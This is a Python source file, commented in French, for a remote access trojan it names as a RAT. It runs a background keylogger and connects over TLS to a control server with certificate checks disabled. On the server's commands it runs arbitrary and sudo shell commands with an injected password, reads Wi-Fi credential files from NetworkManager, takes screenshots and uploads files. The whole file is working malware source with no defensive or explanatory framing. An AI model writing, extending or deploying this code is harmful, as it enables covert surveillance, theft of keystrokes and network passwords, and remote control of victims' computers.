import socket, ssl, time, subprocess, os, sys, struct, threading, pyautogui, cv2
from pynput import keyboard
from PIL import Image

# --- PARAMÈTRES RÉSEAU ---
CIBLE_IP = "127.0.0.1" 
CIBLE_PORT = 12345 

# --- VARIABLE GLOBALE KEYLOGGER ---
journal_touches = "" 

def enregistreur_frappe(touche):
    global journal_touches
    try:
        journal_touches += str(touche.char)
    except AttributeError:
        if str(touche) == "Key.space": journal_touches += " "
        elif str(touche) == "Key.enter": journal_touches += "\n"
        elif str(touche) == "Key.backspace": journal_touches += " [BS] "
        else: journal_touches += f" [{str(touche).replace('Key.', '')}] "

def demarrer_surveillance_clavier():
    with keyboard.Listener(on_press=enregistreur_frappe) as auditeur:
        auditeur.join()

def executer_avec_privileges(commande, mot_de_passe):
    """Injecte le mot de passe dans sudo via stdin"""
    try:
        cmd_complete = f"echo {mot_de_passe} | sudo -S {commande}"
        processus = subprocess.run(cmd_complete, shell=True, capture_output=True, text=True)
        return processus.stdout + processus.stderr
    except Exception as e:
        return f"Erreur d'élévation : {str(e)}"

def initialisation_flux():
    # Connexion sécurisée au serveur
    connexion_brute = None
    reglages = ssl.create_default_context()
    reglages.check_hostname = False
    reglages.verify_mode = ssl.CERT_NONE 

    try:
        connexion_brute = socket.create_connection((CIBLE_IP, CIBLE_PORT))
        canal_chiffre = reglages.wrap_socket(connexion_brute, server_hostname=CIBLE_IP) 
        
        while True:
            donnee_serveur = canal_chiffre.recv(4096).decode().strip().lower()
            if donnee_serveur in ["exit", "disconnect"]: 
                break
            
            reponse_tache = executeur_de_requetes(donnee_serveur, canal_chiffre)
            
            if reponse_tache is not None:
                canal_chiffre.send(str(reponse_tache).encode()) 
    except Exception:
        pass
    finally:
        if connexion_brute:
            connexion_brute.close()

def executeur_de_requetes(instruction, lien_socket):
    global journal_touches

    # Liste des fonctions du RAT
    if instruction == "get_ip":
        return subprocess.check_output("hostname -I", shell=True).decode().strip()
    
    elif instruction == "wifi":
        return recuperer_configs_reseau() 
    
    elif instruction == "screenshot":
        return generer_instante_ecran() 
    
    elif instruction == "get_keys":
        extraction = journal_touches
        journal_touches = "" 
        return extraction if extraction != "" else "Aucune frappe enregistrée."

    elif instruction.startswith("sudocmd "):
        # Format : sudocmd <password> <commande>
        parties = instruction.split(" ", 2)
        if len(parties) < 3:
            return "Usage: sudocmd <password> <commande>"
        return executer_avec_privileges(parties[2], parties[1])
    
    elif instruction.startswith("download "):
        fichiers = instruction.split(" ", 1)[1].split(";")
        envoi_flux_binaire(fichiers, lien_socket) 
        return None
    
    else:
        return commande_shell_directe(instruction) 

def commande_shell_directe(cmd_text):
    try:
        if cmd_text.startswith("cd "):
            nouveau_dossier = cmd_text.split(" ", 1)[1]
            os.chdir(nouveau_dossier)
            return f"Répertoire changé pour : {os.getcwd()}"
        
        processus = subprocess.run(cmd_text, shell=True, capture_output=True, text=True)
        return processus.stdout + processus.stderr 
    except Exception as e:
        return f"Erreur système : {str(e)}"

def generer_instante_ecran():
    try:
        img = pyautogui.screenshot().convert("RGB")
        img.save("temp_view.jpg", "JPEG") 
        return "Capture effectuée (temp_view.jpg)"
    except Exception:
        return "Échec capture (vérifiez la variable DISPLAY)"

def envoi_flux_binaire(liste_p, sock):
    for p in liste_p:
        if os.path.exists(p):
            n_f = os.path.basename(p)
            t_f = os.path.getsize(p)
            sock.send(struct.pack("!I", len(n_f))) 
            sock.send(n_f.encode())
            sock.send(struct.pack("!Q", t_f)) 
            with open(p, "rb") as f_obj:
                while morceau := f_obj.read(4096):
                    sock.sendall(morceau) 
    sock.send(struct.pack("!I", len("[SYNC]")))
    sock.send("[SYNC]".encode())

def recuperer_configs_reseau():
    # Lit les fichiers WiFi
    try:
        dossier_nm = "/etc/NetworkManager/system-connections/" 
        resultats = []
        for element in os.listdir(dossier_nm):
            output = subprocess.run(["sudo", "cat", os.path.join(dossier_nm, element)], capture_output=True, text=True)
            if output.returncode == 0:
                resultats.append(output.stdout)
        with open("logs_wifi.txt", "w") as f_log:
            f_log.write("\n".join(resultats))
        return "Données Wi-Fi extraites dans logs_wifi.txt" 
    except Exception:
        return "Erreur d'accès aux fichiers réseaux"

if __name__ == "__main__":
    threading.Thread(target=demarrer_surveillance_clavier, daemon=True).start()
    initialisation_flux()
